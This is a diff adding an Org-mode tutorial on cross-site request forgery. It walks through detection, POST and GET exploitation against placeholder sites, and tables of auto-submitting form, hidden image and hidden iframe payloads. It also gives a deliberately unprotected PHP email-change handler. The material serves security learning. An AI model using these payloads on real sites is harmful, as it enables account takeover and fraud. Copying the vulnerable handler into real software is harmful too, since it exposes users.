@@ -1,1 +1,263 @@
 #+title: Cross Site Request Forgery
+#+author: gabriel
+
+* intro
+Cross-Site Request Forgery (CSRF) is a type of cyberattack commonly found in web applications that causes an authenticated user to submit an unwanted or unauthorized command to a web server without their knowledge.
+
+The potential impact of CSRF attacks varies depending on the functionality of the vulnerable application and the privilege level of the victim. Key impacts include:
+
+*unauthorized actions* ->
+Performing actions on behalf of the user, such as changing account information (password, email), posting on social media accounts, or ordering products from e-commerce sites.
+
+*compromised data integrity* ->
+Unauthorized modification or deletion of data in the application's database.
+
+*financial losses* ->
+ In banking or e-commerce applications, money transfers or purchases can be made on behalf of the victim.
+
+*account takeover* ->
+By exploiting password or email change functionalities, it may be possible to completely take over the victim's account.
+
+** example scenario
+1. The victim logs into theri banking application at https://vulnerable-bank.com, and their browser stores a session cookie for this site
+
+2. The attacker crafts a forged money transfer request, such as URL Like https:///vulnerable-bank.com/transfer?to=attacker&amount=1000
+
+3. The attacker embeds a mechanism to trigger this request on a web site they control https://attacker-site.com. This could be a hidden <img> tag, or an auto-submitting form.
+
+4. The victim visist the https://attacker-site.com while their banking session is still active.
+
+5. The victim browser automatically sends a GET request to the URL in the <img> tag src attribute. The browser automatically includes the session cookie for vulnerable-bank.com in this request
+
+6. The vulnerable-bank.com server receives the request with a valid session cookie, threats it as legitimate, and transfer 1000 units of currency to the attacker account.
+
+* detection and exploitation
+Detecting and exploiting CSRF vulnerabilities requires understanding how the application handles state-changing requests.
+
+These requests include actions like changing a user's password, adding an item to their cart, or updating any information in their account.
+
+1. Identify a state-changing action in the application (e.g., updating an email address).
+
+2. Capture the HTTP request generated when performing this action using a proxy tool (e.g., Burp Suite).
+
+3. Analyze whether the request relies solely on cookies for session management.
+
+4. Check if the request includes an unpredictable, per-request parameter (an Anti-CSRF token).
+
+5. If there is no token, attempt to exploit the vulnerability by creating a forged HTML form or URL that mimics this request.
+
+The biggest sign that a request is vulnerable to CSRF is the absence of a secret, unpredictable value used to verify the request.
+
+Besides the session cookie, you are looking for a second, unique factor (a token) that authenticates the specific request.
+
+** common token parameter and example values
+- csrf_token=a1b2c3d4e5f6...
+- authenticity_token=b1c2d3e4f5a6... (Ruby on Rails)
+- __RequestVerificationToken=c2d3e4f5a6b1... (ASP.NET)
+- xsrf_token=d3e4f5a6b1c2...
+- nonce=e4f5a6b1c2d3...
+
+** common token header names and example values (AJAX)
+- X-CSRF-Token: f5a6b1c2d3e4...
+- X-XSRF-TOKEN: a6b1c2d3e4f5...
+
+  If a request relies solely on a session cookie for authentication and does not include an additional, unpredictable protection like the ones listed above, it is highly likely to be vulnerable to CSRF.
+
+* Post-based CSRF exploitation
+Requests made with the POST method are typically triggered by a form submission in the browser. This is the most common scenario for CSRF attacks.
+
+** change email scenario
+1. legitimate request analysis
+   #+begin_src python
+POST /my-profile/change-email HTTP/1.1
+Host: vulnerable-site.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Cookie: session=AbC1dE2fGhI3jK4LmN5oPqR6sT7uV8wX
+
+email=new.user.email@example.com
+   #+end_src
+
+If the server successfully processes the request, it usually returns a response that redirects the user back to their profile page.
+
+#+begin_src python
+HTTP/1.1 302 Found
+Location: /my-profile
+Set-Cookie: session=AbC1dE2fGhI3jK4LmN5oPqR6sT7uV8wX; HttpOnly
+Content-Length: 0
+#+end_src
+
+In this request, there is no random token to verify the legitimacy of the request other than the session cookie. This indicates a CSRF vulnerability.
+
+** Preparing the CSRF payload
+The attacker prepares an HTML page that will mimic this request and execute automatically in the victim's browser.
+
+#+begin_src html
+<html>
+  <body>
+    <form action="https://vulnerable-site.com/my-profile/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker.email@evil.com" />
+    </form>
+    <script>
+      // Automatically submit the form
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+#+end_src
+
+*explanation* ->
+- form action: Specifies the target URL where the request will be sent.
+- method="POST": Specifies that the request will use the POST method.
+- input type="hidden": Contains the email parameter and its value (attacker.email@evil.com), which will be sent with the request but will be invisible on the form.
+- script: Triggers the attack by automatically submitting the form when the page loads.
+
+** exploitation and result
+- The victim logs into vulnerable-site.com.
+- The attacker convinces the victim to visit https://attacker-site.com/csrf.html in some way (e.g., via an email or social media message).
+- When the victim visits the page, the JavaScript code automatically submits the form.
+- The victim's browser sends the forged request to vulnerable-site.com. The browser automatically includes the valid session cookie for vulnerable-site.com in this request.
+#+begin_src javascript
+POST /my-profile/change-email HTTP/1.1
+Host: vulnerable-site.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Cookie: session=AbC1dE2fGhI3jK4LmN5oPqR6sT7uV8wX
+Origin: https://attacker-site.com
+
+email=attacker.email@evil.com
+#+end_src
+
+Since the server sees a valid session cookie, it accepts the request as if it were made by a legitimate user and updates the email address to attacker.email@evil.com. The attacker can then use the "forgot password" feature to take full control of the account.
+
+
+* Get-based CSRF Exploitation
+GET requests are simpler and can often be triggered just by clicking a URL or loading a resource (like an image or script).
+
+If a state-changing action is performed via a GET request (which is bad practice from a design perspective), exploitation becomes even easier.
+
+** example scenario
+1. legitimate request analysis
+   The application might handle following a user with a GET request like the one below.
+
+   #+begin_src javascript
+GET /user/follow?user_id=123 HTTP/1.1
+Host: vulnerable-social.com
+Cookie: session=Z1Y2X3W4V5U6T7S8R9Q0P
+   #+end_src
+
+2. preparing the CSRF payload
+An attacker can use a simple <img> tag to trigger this request. The victim doesn't even need to see the image; it can be 1x1 pixel in size.
+
+#+begin_src html
+<html>
+  <body>
+    <h3>Today's Most Popular Posts!</h3>
+    <img src="https://vulnerable-social.com/user/follow?user_id=attacker_id" style="display:none;">
+    <!-- The victim won't see this image, but their browser will send the request -->
+  </body>
+</html>
+#+end_src
+
+Alternatively, the attacker doesn't even need a structure like an <img> tag. They can simply copy the malicious URL (https://vulnerable-social.com/user/follow?user_id=attacker_id)
+
+and send it to the victim via a direct message on the target site, an email, or any other social engineering method to get them to click it.
+
+3. Exploitation and result
+When the victim visits the lure.html page or clicks the malicious link while logged into vulnerable-social.com,  their browser sends a GET request to vulnerable-social.com to either load the src of the <img> tag or navigate to the link.
+
+This request causes the victim to unknowingly follow the attacker's account (attacker_id). This could grant the attacker privileges such as sending private messages or appearing in the victim's feed.
+
+* impacts and payloads
+The impact of a CSRF attack can vary greatly depending on the functionality of the targeted application and the privilege level of the user being attacked.
+
+A successful CSRF attack against an administrator account can have far more devastating consequences than one against a standard user.
+
+The following table summarizes common actions that can be performed through CSRF attacks and their potential consequences.
+
+| Action Type | Example Scenario | Potential Impact
+| Account Management | Changing a user's email address or password. | Complete account takeover.
+| Financial Transactions | Transferring money from a bank account, buying or selling stocks. | Direct financial loss, fraud.
+| E-commerce Actions | Adding items to a user's cart, placing an order, changing the shipping address. | Unwanted purchases, delivery to the wrong address.
+| Social Media | Posting content, sending messages, adding/removing friends on behalf of the user. | Reputational damage, spreading spam, disseminating false information.
+| Privilege Escalation | A low-privileged user making another user with admin rights an administrator of their own account. | Unauthorized access to the system, compromising the security of other users.
+| Data Manipulation | Deleting or modifying important data in the application (e.g., deleting a blog post). | Data loss, disruption of the application's functionality.
+| Voting/Polling | Casting a vote on behalf of a user in a poll or survey. | Manipulation of results, subverting the system's purpose.
+
+Alternatively, the attacker can simply copy the malicious URL (https://vulnerable-social.com/user/follow?user_id=attacker_id) and send it to the victim via a private message.
+
+** Get-based payloads
+Since GET requests are triggered via a URL, payloads are often hidden within links or media tags.
+
+| Payload | Description
+| <a href="https://vulnerable-site.com/action?param=value">Click Me!</a> | Triggers the attack when the user clicks a link. This is the simplest method.
+| <img src="https://vulnerable-site.com/action?param=value" width="1" height="1"> | Triggers automatically when the page loads. The user does not need to take any action. Can be completely hidden with display:none.
+| <link rel="stylesheet" href="https://vulnerable-site.com/action?param=value"> | Triggers the browser to make the request automatically by pretending to be a CSS file.
+| <script src="https://vulnerable-site.com/action?param=value"></script> | Sends the request by pretending to be a JavaScript file.
+
+** Post-basesd Payloads
+POST requests typically require a form submission. Therefore, payloads are HTML forms that contain JavaScript for auto-submission.
+
+| Payload | Description
+| <html>...<form action="..." method="POST">...</form><script>document.forms[0].submit();</script></html> | The most common POST payload. It automatically submits the form when the page loads.
+| <form id="csrf-form" ...>...</form><script>document.getElementById('csrf-form').submit();</script> | Used to target a specific form on pages where there are multiple forms.
+| <iframe style="display:none" name="csrf-iframe"></iframe><form action="..." method="POST" target="csrf-iframe">...</form><script>document.forms[0].submit();</script> | Executes the request within a hidden iframe to prevent the page from reloading or redirecting upon form submission. This makes the attack stealthier.
+
+These payloads demonstrate the basic exploitation mechanisms of CSRF vulnerabilities. Real-world attacks may combine these basic structures with more complex scenarios and obfuscation techniques.
+
+* vulnerable code example
+
+** vulnerable email change code in php
+The following PHP code contains simple logic for changing a user's email address. However, it is vulnerable because it lacks any CSRF protection.
+#+begin_src php
+<?php
+session_start();
+
+// Check if the user is logged in
+if (!isset($_SESSION['user_id'])) {
+    // If no session, redirect to the login page
+    header('Location: /login.php');
+    exit();
+}
+
+// Assuming a database connection
+// include 'db_connection.php';
+
+// If the form was submitted via POST method
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+
+    // Get the new email address
+    $new_email = $_POST['email'];
+    $user_id = $_SESSION['user_id'];
+
+    // --- VULNERABLE PART ---
+    // At this point, there is NO check for an Anti-CSRF token
+    // to verify that the request was genuinely made by the user.
+    // A request from a malicious form prepared by an attacker
+    // will be accepted as long as it includes a valid session cookie.
+
+    // Update the email address in the database (pseudo-code)
+    // updateUserEmail($user_id, $new_email);
+
+    echo "Your email address has been successfully updated to: " . htmlspecialchars($new_email);
+    // Usually, the user is redirected to their profile page
+    // header('Location: /profile.php');
+    // exit();
+}
+
+?>
+
+<!-- Email change form -->
+<form method="POST" action="change_email.php">
+    <label for="email">New Email Address:</label>
+    <input type="email" id="email" name="email">
+    <button type="submit">Update</button>
+</form>
+#+end_src
+
+- *Session Management*--> Based Only on Cookies--> The code relies solely on the $_SESSION['user_id'] value to authenticate the user. This session is managed by a cookie stored in the browser.
+- *Lack of Anti-CSRF Token*--> When processing the POST request, the code does not check for a unique token to verify the origin of the request. The $_POST['email'] value is taken and processed directly.
+- *Predictable Request*--> An attacker can easily predict which URL (change_email.php) and which parameters (email) this form sends requests to.
+
+
+When these three factors come together, an attacker can change the email address of any user logged into vulnerable-site.com with a form hosted on their own site that has an action="https://vulnerable-site.com/change_email.php".
